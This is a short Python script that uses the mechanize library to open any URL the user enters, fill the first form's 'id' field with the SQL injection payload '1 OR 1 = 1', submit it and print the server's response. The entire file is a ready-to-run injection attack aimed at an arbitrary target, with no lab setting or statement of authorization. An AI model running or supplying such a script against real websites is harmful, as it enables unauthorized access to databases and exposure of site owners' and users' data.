#
#

import mechanize

url = input("Enter the full url")
request = mechanize.Browser()
request.open(url)

request.select_form(nr = 0)

request["id"] = "1 OR 1 = 1"

response = request.submit()
content = response.read()
print(content)
